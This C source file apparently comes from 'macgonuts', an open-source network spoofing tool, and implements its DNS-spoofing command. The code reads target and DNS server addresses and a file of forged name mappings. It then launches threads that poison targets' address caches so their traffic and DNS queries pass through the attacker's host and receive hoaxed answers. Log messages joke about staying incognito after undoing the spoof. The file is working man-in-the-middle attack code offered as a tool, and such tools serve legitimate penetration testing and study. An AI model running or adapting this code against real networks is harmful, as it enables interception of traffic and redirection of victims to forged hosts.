/*
 * Copyright (c) 2023, Rafael Santiago
 * All rights reserved.
 *
 * This source code is licensed under the BSD-style license found in the
 * LICENSE file in the root directory of this source tree.
 */
#include <cmd/macgonuts_dnsspoof_task.h>
#include <cmd/macgonuts_dnsspoof_defs.h>
#include <cmd/macgonuts_option.h>
#include <cmd/macgonuts_misc_utils.h>
#include <cmd/hooks/macgonuts_dnsspoof_init_hook.h>
#include <cmd/hooks/macgonuts_dnsspoof_deinit_hook.h>
#include <cmd/hooks/macgonuts_dnsspoof_done_hook.h>
#include <cmd/hooks/macgonuts_dnsspoof_redirect_hook.h>
#include <macgonuts_ipconv.h>
#include <macgonuts_socket_common.h>
#include <macgonuts_socket.h>
#include <macgonuts_thread.h>
#include <macgonuts_iplist.h>
#include <macgonuts_etc_hoax.h>
#include <macgonuts_spoof.h>
#include <macgonuts_metaspoofer.h>
#include <macgonuts_status_info.h>

#define DEFAULT_ETC_HOAX_PATH "/usr/local/share/macgonuts/etc/hoax"

static int gShouldExit = 0;

struct dnsspoof_task_ctx {
    macgonuts_thread_t th;
    macgonuts_etc_hoax_handle *etc_hoax_handle;
    macgonuts_iplist_handle *iplist_handle;
    size_t hoax_ttl;
    char lo_iface[256];
    char tg_address[256];
    char spoof_address[256];
    struct macgonuts_spoofing_guidance_ctx spfgd;
    macgonuts_socket_t gw_wire;
};

static struct dnsspoof_task_ctx **alloc_dnsspoof_task_contexts(size_t *tasks_nr,
                                                               const char *iface,
                                                               const char **target_addrs,
                                                               const size_t target_addrs_nr,
                                                               macgonuts_iplist_handle *iplist_handle,
                                                               macgonuts_etc_hoax_handle *etc_hoax_handle,
                                                               const char **dns_addrs,
                                                               const size_t dns_addrs_nr,
                                                               const size_t hoax_ttl);

static void free_dnsspoof_task_contexts(struct dnsspoof_task_ctx **tasks, const size_t tasks_nr);

static int execute_dnsspoof_tasks(struct dnsspoof_task_ctx **tasks, const size_t tasks_nr);

static void sigint_watchdog(int signal);

void *run_metaspoofer(void *arg);

int macgonuts_dnsspoof_task(void) {
    struct dnsspoof_task_ctx **dnsspoof_tasks = NULL;
    size_t tasks_nr = 0;
    const char *lo_iface = NULL;
    const char *etc_hoax = NULL;
    macgonuts_etc_hoax_handle *etc_hoax_handle = NULL;
    char **target_addrs = NULL;
    size_t target_addrs_nr = 0;
    macgonuts_iplist_handle *iplist_handle = NULL;
    const char *hoax_ttl = NULL;
    size_t hoax_ttl_value = 0;
    char **dns_addrs = NULL;
    size_t dns_addrs_nr = 0;
    const char *target_addrs_csv = NULL;
    size_t target_addrs_csv_size = 0;
    int err = EFAULT;

    lo_iface = macgonuts_get_option("lo-iface", NULL);
    if (lo_iface == NULL) {
        macgonuts_si_error("--lo-iface option is missing.\n");
        err = EXIT_FAILURE;
        goto macgonuts_dnsspoof_task_epilogue;
    }

    hoax_ttl = macgonuts_get_option("hoax-ttl", "5");

    assert(hoax_ttl != NULL);

    if (!macgonuts_is_valid_number(hoax_ttl)) {
        macgonuts_si_error("--hoax-ttl must be a valid number.\n");
        err = EXIT_FAILURE;
        goto macgonuts_dnsspoof_task_epilogue;
    }

    hoax_ttl_value = atoi(hoax_ttl);
    if (hoax_ttl_value == 0) {
        macgonuts_si_error("--hoax-ttl must be a number greater than zero.\n");
        err = EXIT_FAILURE;
        goto macgonuts_dnsspoof_task_epilogue;
    }

    etc_hoax = macgonuts_get_option("etc-hoax", DEFAULT_ETC_HOAX_PATH);

    assert(etc_hoax != NULL);

    etc_hoax_handle = macgonuts_open_etc_hoax(etc_hoax);
    if (etc_hoax_handle == NULL) {
        macgonuts_si_error("unable to open etc-hoax file at `%s`.\n", etc_hoax);
        err = EXIT_FAILURE;
        goto macgonuts_dnsspoof_task_epilogue;
    }

    target_addrs = macgonuts_get_array_option("target-addrs", NULL, &target_addrs_nr);
    if (target_addrs == NULL) {
        macgonuts_si_error("--target-addrs option is missing.\n");
        err = EXIT_FAILURE;
        goto macgonuts_dnsspoof_task_epilogue;
    }

    target_addrs_csv = macgonuts_get_option("target-addrs", NULL);
    assert(target_addrs_csv != NULL);
    target_addrs_csv_size = strlen(target_addrs_csv);
    iplist_handle = macgonuts_iplist_parse(target_addrs_csv, target_addrs_csv_size);
    if (iplist_handle == NULL) {
        macgonuts_si_error("unable to parse iplist handle.\n");
        err = EXIT_FAILURE;
        goto macgonuts_dnsspoof_task_epilogue;
    }

    dns_addrs = macgonuts_get_array_option("dns-addrs", NULL, &dns_addrs_nr);

    dnsspoof_tasks = alloc_dnsspoof_task_contexts(&tasks_nr,
                                                  lo_iface,
                                                  (const char **)target_addrs, target_addrs_nr,
                                                  iplist_handle,
                                                  etc_hoax_handle,
                                                  (const char **)dns_addrs, dns_addrs_nr,
                                                  atoi(hoax_ttl));
    if (dnsspoof_tasks == NULL) {
        macgonuts_si_error("unable to allocate task contexts.\n");
        err = EXIT_FAILURE;
        goto macgonuts_dnsspoof_task_epilogue;
    }

    macgonuts_free_array_option_value(target_addrs, target_addrs_nr);
    target_addrs = NULL;
    macgonuts_free_array_option_value(dns_addrs, dns_addrs_nr);
    dns_addrs = NULL;

    err = execute_dnsspoof_tasks(dnsspoof_tasks, tasks_nr);

macgonuts_dnsspoof_task_epilogue:

    if (dnsspoof_tasks != NULL) {
        free_dnsspoof_task_contexts(dnsspoof_tasks, tasks_nr);
    }

    if (target_addrs != NULL) {
        macgonuts_free_array_option_value(target_addrs, target_addrs_nr);
    }

    if (dns_addrs != NULL) {
        macgonuts_free_array_option_value(dns_addrs, dns_addrs_nr);
    }

    if (etc_hoax_handle != NULL) {
        macgonuts_close_etc_hoax(etc_hoax_handle);
    }

    if (iplist_handle != NULL) {
        macgonuts_iplist_release(iplist_handle);
    }

    return err;
}

int macgonuts_dnsspoof_task_help(void) {
    macgonuts_si_print("use: macgonuts dnsspoof --lo-iface=<label> --target-addrs=<ip4|ip6 list>\n"
                       "                       [--etc-hoax=<filepath> --hoax-ttl=<secs> --dns-addrs=<ip4|ip6 list>\n"
                       "                        --undo-spoof]\n");
    return EXIT_SUCCESS;
}

static struct dnsspoof_task_ctx **alloc_dnsspoof_task_contexts(size_t *tasks_nr,
                                                               const char *iface,
                                                               const char **target_addrs,
                                                               const size_t target_addrs_nr,
                                                               macgonuts_iplist_handle *iplist_handle,
                                                               macgonuts_etc_hoax_handle *etc_hoax_handle,
                                                               const char **dns_addrs,
                                                               const size_t dns_addrs_nr,
                                                               const size_t hoax_ttl) {
    struct dnsspoof_task_ctx **tasks = NULL;
    struct dnsspoof_task_ctx **tp = NULL, **tp_end = NULL;
    const char **target_addr = NULL;
    const char **target_addrs_end = NULL;
    const char **dns_addr = NULL;
    const char **dns_addrs_end = NULL;
    char iface_buf[256] = "";
    uint8_t gw_addr[2][16];
    size_t gw_addr_size[2];
    size_t gw_i = 0;
    uint8_t iface_netmask[2][16];
    size_t iface_size = 0;
    int ip_version;
    uint8_t iface_addr[2][16];
    char iface_addr_buf[256] = "";
    typedef enum {
        kNone = 0,
        kIPv4 = 2,
        kIPv6 = kIPv4 << 1,
    } ip_version_status_t;
    ip_version_status_t iface_ip_support = kNone;
    size_t dns_addr_size;
    int *dns_ip_version = NULL;
    size_t d;
    size_t target_addr_size;
    char lit_gw_addr[256] = "";
    size_t lit_gw_addr_size;
    int err = EXIT_FAILURE;
    struct macgonuts_get_spoof_layers_info_ex_ctx sk_info[2] = { 0 };

    assert(tasks_nr != NULL
           && iface != NULL
           && target_addrs != NULL
           && target_addrs_nr > 0
           && etc_hoax_handle != NULL
           && hoax_ttl > 0);

    memset(&gw_addr[0], 0, sizeof(gw_addr));
    memset(&iface_netmask[0], 0, sizeof(iface_netmask));
    memset(&iface_addr[0], 0, sizeof(iface_addr));
    memset(&sk_info[0], 0, sizeof(sk_info));

    *tasks_nr = 0;

    iface_size = strlen(iface);

    macgonuts_get_gateway_addr_info_from_iface(&gw_addr[1][0], &gw_addr_size[1], 4, iface);

    if (macgonuts_get_gateway_addr_info_from_iface(&gw_addr[0][0], &gw_addr_size[0], 6, iface) != EXIT_SUCCESS
        && gw_addr_size[0] == 0) {
        macgonuts_si_error("unable to get gateway address.\n");
        return NULL;
    }

    if (macgonuts_get_netmask_from_iface(iface, iface_size, &iface_netmask[1][0], 4) != EXIT_SUCCESS
        && macgonuts_get_netmask_from_iface(iface, iface_size, &iface_netmask[0][0], 6) != EXIT_SUCCESS) {
        macgonuts_si_error("unable to get network mask.\n");
        return NULL;
    }

    if (macgonuts_get_addr_from_iface_unix(iface_addr_buf, sizeof(iface_addr_buf), 4, iface) == EXIT_SUCCESS
        && macgonuts_get_raw_ip_addr(&iface_addr[1][0], 4, iface_addr_buf, strlen(iface_addr_buf)) == EXIT_SUCCESS) {
        iface_ip_support = kIPv4;
    }

    if (macgonuts_get_addr_from_iface_unix(iface_addr_buf, sizeof(iface_addr_buf), 6, iface) == EXIT_SUCCESS
        && macgonuts_get_raw_ip_addr(&iface_addr[0][0], 16, iface_addr_buf, strlen(iface_addr_buf)) == EXIT_SUCCESS) {
        iface_ip_support |= kIPv6;
    }

    if (iface_ip_support == kNone) {
        macgonuts_si_error("your interface `%s` has not support for ipv4 neither ipv6.\n", iface);
        return NULL;
    }

    // INFO(Rafael): Since we are creating a spoofing channel from n targets T to n dns-servers D
    //               We will create T x D spoofing tasks. However, with D equals to zero it means
    //               T spoofing tasks having spoof-addr equals to the network gateway.

    *tasks_nr = target_addrs_nr * ((dns_addrs_nr == 0) ? 1 : dns_addrs_nr);

    tasks = (struct dnsspoof_task_ctx **)malloc(*tasks_nr * sizeof(struct dnsspoof_task_ctx **));
    if (tasks == NULL) {
        macgonuts_si_error("no memory for task contexts.\n");
        *tasks_nr = 0;
        goto alloc_dnsspoof_tasks_contexts_epilogue;
    }
    memset(tasks, 0, *tasks_nr * sizeof(struct dnsspoof_tasks_ctx **));

    tp = tasks;
    tp_end = tp + *tasks_nr;

    do {
        (*tp) = (struct dnsspoof_task_ctx *)malloc(sizeof(struct dnsspoof_task_ctx));
        if ((*tp) == NULL) {
            macgonuts_si_error("no memory for task context item.\n");
            goto alloc_dnsspoof_tasks_contexts_epilogue;
        }
        memset((*tp), 0, sizeof(struct dnsspoof_task_ctx));
        if (macgonuts_mutex_init(&(*tp)->spfgd.handles.lock) != EXIT_SUCCESS) {
            macgonuts_si_error("unable to initialize task mutex.\n");
            goto alloc_dnsspoof_tasks_contexts_epilogue;
        }
        (*tp)->etc_hoax_handle = etc_hoax_handle;
        (*tp)->iplist_handle = iplist_handle;
        (*tp)->hoax_ttl = hoax_ttl;
        if (tp == tasks) {
            (*tp)->spfgd.hooks.init = macgonuts_dnsspoof_init_hook;
            (*tp)->spfgd.hooks.deinit = macgonuts_dnsspoof_deinit_hook;
        }
        (*tp)->spfgd.hooks.done = macgonuts_dnsspoof_done_hook;
        (*tp)->spfgd.hooks.redirect = macgonuts_dnsspoof_redirect_hook;
        macgonuts_dnsspoof_set_etc_hoax(&(*tp)->spfgd, (*tp)->etc_hoax_handle);
        macgonuts_dnsspoof_set_iplist(&(*tp)->spfgd, (*tp)->iplist_handle);
        macgonuts_dnsspoof_set_ttl(&(*tp)->spfgd, &(*tp)->hoax_ttl);
        macgonuts_dnsspoof_set_gw_wire(&(*tp)->spfgd, &(*tp)->gw_wire);
        (*tp)->spfgd.spoofing.timeout = 1;
        tp++;
    } while (tp != tp_end);

    tp = tasks;

    target_addr = target_addrs;
    target_addrs_end = target_addrs + target_addrs_nr;

    if (dns_addrs_nr == 0) {
        // INFO(Rafael): It does mean that we are diverting all traffic from every target to us by redirect later.
        //               To achieve it, we need to set as spoof_address our interface gateway.
        while (target_addr != target_addrs_end && tp != tp_end) {
            target_addr_size = strlen(*target_addr);
            ip_version = macgonuts_get_ip_version(*target_addr, target_addr_size);
            if ((ip_version != 4 && ip_version != 6)
                || (ip_version == 4 && !(iface_ip_support & kIPv4))
                || (ip_version == 6 && !(iface_ip_support & kIPv6))) {
                macgonuts_si_error("target address `%s` seems invalid.\n", *target_addr);
                goto alloc_dnsspoof_tasks_contexts_epilogue;
            }
            memcpy(&(*tp)->lo_iface[0], iface, iface_size % sizeof((*tp)->lo_iface));
            memcpy(&(*tp)->tg_address[0], *target_addr, target_addr_size);
            gw_i = (ip_version == 4);
            if (tp == tasks) {
                if (macgonuts_raw_ip2literal(&(*tp)->spoof_address[0], sizeof((*tp)->spoof_address) - 1,
                                             gw_addr[gw_i], gw_addr_size[gw_i]) != EXIT_SUCCESS) {
                    macgonuts_si_error("unable to convert gateway address to its literal.\n");
                    goto alloc_dnsspoof_tasks_contexts_epilogue;
                }
                lit_gw_addr_size = strlen((*tp)->spoof_address);
            } else {
                memcpy(&(*tp)->spoof_address[0], &(*tasks)->spoof_address[0], lit_gw_addr_size);
            }
            (*tp)->spfgd.handles.wire = macgonuts_create_socket((*tp)->lo_iface, 1);
            if ((*tp)->spfgd.handles.wire == -1) {
                macgonuts_si_error("unable to create socket.\n");
                goto alloc_dnsspoof_tasks_contexts_epilogue;
            }
            // INFO(Rafael): This socket will be used to communicate with external DNS.
            (*tp)->gw_wire = macgonuts_create_socket(iface, 1);
            sk_info[0].rsk = (*tp)->spfgd.handles.wire;
            sk_info[0].iface = (*tp)->lo_iface;
            sk_info[1].rsk = (*tp)->gw_wire;
            sk_info[1].iface = iface_buf;
            if ((*tp)->gw_wire == -1) {
                macgonuts_si_error("unable to create socket.\n");
                goto alloc_dnsspoof_tasks_contexts_epilogue;
            }
            if (macgonuts_get_spoof_layers_info_ex(&sk_info[0],
                                                   sizeof(sk_info) / sizeof(sk_info[0]),
                                                   &(*tp)->spfgd.layers,
                                                   (*tp)->tg_address, target_addr_size,
                                                   (*tp)->spoof_address, lit_gw_addr_size,
                                                   (*tp)->lo_iface) != EXIT_SUCCESS) {
                macgonuts_si_error("unable to fill up task's spoofing layer information.\n");
                goto alloc_dnsspoof_tasks_contexts_epilogue;
            }
            (*tp)->spfgd.layers.spoofing_gateway = 1;
            (*tp)->spfgd.usrinfo.lo_iface = &(*tp)->lo_iface[0];
            (*tp)->spfgd.usrinfo.tg_address = &(*tp)->tg_address[0];
            (*tp)->spfgd.usrinfo.spoof_address = &(*tp)->spoof_address[0];
            target_addr++;
            tp++;
        }
    } else {
        dns_ip_version = (int *) malloc(sizeof(int *) * dns_addrs_nr);
        if (dns_ip_version == NULL) {
            macgonuts_si_error("no memory for dns address version array.\n");
            goto alloc_dnsspoof_tasks_contexts_epilogue;
        }
        memset(dns_ip_version, -1, sizeof(int *) * dns_addrs_nr);
        dns_addrs_end = dns_addrs + dns_addrs_nr;
        while (target_addr != target_addrs_end && tp != tp_end) {
            target_addr_size = strlen(*target_addr);
            ip_version = macgonuts_get_ip_version(*target_addr, target_addr_size);
            if ((ip_version != 4 && ip_version != 6)
                || (ip_version == 4 && !(iface_ip_support & kIPv4))
                || (ip_version == 6 && !(iface_ip_support & kIPv6))) {
                macgonuts_si_error("target address `%s` seems invalid.\n", *target_addr);
                goto alloc_dnsspoof_tasks_contexts_epilogue;
            }
            gw_i = (dns_ip_version[d] == 4);
            dns_addr = dns_addrs;
            while (dns_addr != dns_addrs_end && tp != tp_end) {
                if (target_addr == target_addrs) {
                    d = (dns_addrs_end - dns_addrs) - (dns_addrs_end - dns_addr);
                    dns_addr_size = strlen(*dns_addr);
                    dns_ip_version[d] = macgonuts_get_ip_version(*dns_addr, dns_addr_size);
                    if ((dns_ip_version[d] != 4 && dns_ip_version[d] != 6)
                        || (dns_ip_version[d] == 4 && !(iface_ip_support & kIPv4))
                        || (dns_ip_version[d] == 6 && !(iface_ip_support & kIPv6))) {
                        macgonuts_si_error("dns address `%s` seems invalid.\n", *dns_addr);
                        goto alloc_dnsspoof_tasks_contexts_epilogue;
                    }
                    if (macgonuts_raw_ip2literal(&lit_gw_addr[0], sizeof(lit_gw_addr) - 1,
                                                 gw_addr[gw_i], gw_addr_size[gw_i]) != EXIT_SUCCESS) {
                        macgonuts_si_error("unable to convert gateway address to its literal.\n");
                        goto alloc_dnsspoof_tasks_contexts_epilogue;
                    }
                    lit_gw_addr_size = strlen(lit_gw_addr);
                }
                if (ip_version == dns_ip_version[d]) {
                    dns_addr_size = strlen(*dns_addr);
                    if (macgonuts_get_raw_ip_addr(&(*tp)->spfgd.layers.spoof_proto_addr[0],
                                                  (ip_version == 4) ? 4 : 16,
                                                  *dns_addr, dns_addr_size) != EXIT_SUCCESS) {
                        macgonuts_si_error("unable to convert dns address `%s`.\n", *dns_addr);
                        goto alloc_dnsspoof_tasks_contexts_epilogue;
                    }
                    (*tp)->spfgd.layers.spoofing_gateway =
                        !macgonuts_addrs_from_same_network(&(*tp)->spfgd.layers.spoof_proto_addr[0],
                                                           &iface_addr[gw_i][0],
                                                           &iface_netmask[gw_i][0],
                                                           ip_version);
                    if (!(*tp)->spfgd.layers.spoofing_gateway) {
                        memcpy(&(*tp)->spoof_address[0], *dns_addr, dns_addr_size);
                    } else {
                        memcpy(&(*tp)->spoof_address[0], lit_gw_addr, lit_gw_addr_size);
                    }
                    memcpy(&(*tp)->lo_iface[0], iface, iface_size % sizeof((*tp)->lo_iface));
                    memcpy(&(*tp)->tg_address[0], *target_addr, target_addr_size);
                    (*tp)->spfgd.handles.wire = macgonuts_create_socket((*tp)->lo_iface, 1);
                    if ((*tp)->spfgd.handles.wire == -1) {
                        macgonuts_si_error("unable to create socket.\n");
                        goto alloc_dnsspoof_tasks_contexts_epilogue;
                    }
                    // INFO(Rafael): If the DNS is internal we will use the same socket from the lo_iface,
                    //               otherwise we will create a socket at the wire of the interface that
                    //               we use to reach the gateway.
                    (*tp)->gw_wire = ((*tp)->spfgd.layers.spoofing_gateway) ?
                                        macgonuts_create_socket(iface_buf, 1) : (*tp)->spfgd.handles.wire;
                    if ((*tp)->gw_wire == -1) {
                        macgonuts_si_error("unable to create socket.\n");
                        goto alloc_dnsspoof_tasks_contexts_epilogue;
                    }
                    if (!(*tp)->spfgd.layers.spoofing_gateway
                        && macgonuts_get_spoof_layers_info((*tp)->spfgd.handles.wire,
                                                           &(*tp)->spfgd.layers,
                                                           (*tp)->tg_address, target_addr_size,
                                                           (*tp)->spoof_address, dns_addr_size,
                                                           (*tp)->lo_iface) != EXIT_SUCCESS) {
                        macgonuts_si_error("unable to fill up task's spoofing layer information.\n");
                        goto alloc_dnsspoof_tasks_contexts_epilogue;
                    } else if ((*tp)->spfgd.layers.spoofing_gateway) {
                        sk_info[0].rsk = (*tp)->spfgd.handles.wire;
                        sk_info[0].iface = (*tp)->lo_iface;
                        sk_info[1].rsk = (*tp)->gw_wire;
                        sk_info[1].iface = iface_buf;
                        if (macgonuts_get_spoof_layers_info_ex(&sk_info[0],
                                                               sizeof(sk_info) / sizeof(sk_info[0]),
                                                               &(*tp)->spfgd.layers,
                                                               (*tp)->tg_address, target_addr_size,
                                                               (*tp)->spoof_address, lit_gw_addr_size,
                                                               (*tp)->lo_iface) != EXIT_SUCCESS) {
                            macgonuts_si_error("unable to fill up task's spoofing layer information.\n");
                            goto alloc_dnsspoof_tasks_contexts_epilogue;
                        }
                    }
                    (*tp)->spfgd.layers.spoofing_gateway = 1;
                    (*tp)->spfgd.usrinfo.lo_iface = &(*tp)->lo_iface[0];
                    (*tp)->spfgd.usrinfo.tg_address = &(*tp)->tg_address[0];
                    (*tp)->spfgd.usrinfo.spoof_address = &(*tp)->spoof_address[0];
                    tp++;
                }
                dns_addr++;
            }
            target_addr++;
        }
    }

    err = EXIT_SUCCESS;

alloc_dnsspoof_tasks_contexts_epilogue:

    if (err != EXIT_SUCCESS) {
        free_dnsspoof_task_contexts(tasks, *tasks_nr);
        *tasks_nr = 0;
        tasks = NULL;
    }

    if (dns_ip_version != NULL) {
        free(dns_ip_version);
    }

    return tasks;
}

static void free_dnsspoof_task_contexts(struct dnsspoof_task_ctx **tasks, const size_t tasks_nr) {
    struct dnsspoof_task_ctx **tp = tasks;
    struct dnsspoof_task_ctx **tp_end = tp + tasks_nr;
    while (tp != tp_end) {
        if ((*tp)->spfgd.handles.wire != -1) {
            macgonuts_release_spoof_layers_ctx(&(*tp)->spfgd.layers);
            if ((*tp)->gw_wire != (*tp)->spfgd.handles.wire) {
                macgonuts_release_socket((*tp)->gw_wire);
            }
            macgonuts_release_socket((*tp)->spfgd.handles.wire);
            if (macgonuts_mutex_destroy(&(*tp)->spfgd.handles.lock) != EXIT_SUCCESS) {
                macgonuts_si_warn("unable to deinitilize task mutex.\n");
            }
        }
        tp++;
        free(tp[-1]);
    }
    free(tasks);
}

static int execute_dnsspoof_tasks(struct dnsspoof_task_ctx **tasks, const size_t tasks_nr) {
    struct dnsspoof_task_ctx **task = tasks;
    struct dnsspoof_task_ctx **tasks_end = tasks + tasks_nr;
    int err = EXIT_FAILURE;
    signal(SIGINT, sigint_watchdog);
    signal(SIGTERM, sigint_watchdog);

    do {
        err = macgonuts_create_thread(&(*task)->th, run_metaspoofer, &(*task)->spfgd);
        task++;
    } while (task != tasks_end && err == EXIT_SUCCESS);

    if (err != EXIT_SUCCESS) {
        return err;
    }

    while (!gShouldExit) {
        usleep(100);
    }

    for (task = tasks; task != tasks_end; task++) {
        macgonuts_mutex_lock(&(*task)->spfgd.handles.lock);
        (*task)->spfgd.spoofing.abort = 1;
        macgonuts_mutex_unlock(&(*task)->spfgd.handles.lock);
    }

    task = tasks;
    do {
        macgonuts_thread_join(&(*task)->th, NULL);
        task++;
    } while (task != tasks_end);

    if (macgonuts_get_bool_option("undo-spoof", 0)) {
        task = tasks;
        do {
            if (macgonuts_undo_spoof((*task)->spfgd.handles.wire, &(*task)->spfgd.layers) == EXIT_SUCCESS) {
                macgonuts_si_info("spoof undone at `%s`, muahauhahauhauahuah, you have chances of "
                                  "staying incognito.\n", (*task)->spfgd.usrinfo.tg_address);
            } else {
                macgonuts_si_warn("unable to undo spoof at `%s`, maybe you better run...\n",
                                  (*task)->spfgd.usrinfo.tg_address);
            }
            task++;
        } while (task != tasks_end);
    }

    return EXIT_SUCCESS;
}

static void sigint_watchdog(int signal) {
    gShouldExit = 1;
}

void *run_metaspoofer(void *arg) {
    struct macgonuts_spoofing_guidance_ctx *spfgd = (struct macgonuts_spoofing_guidance_ctx *)arg;
    if (macgonuts_run_metaspoofer(spfgd) != EXIT_SUCCESS) {
        macgonuts_si_error("when trying to run metaspoofer for spoofing task at [%p].\n", spfgd);
    }
    return NULL;
}

#undef DEFAULT_ETC_HOAX_PATH
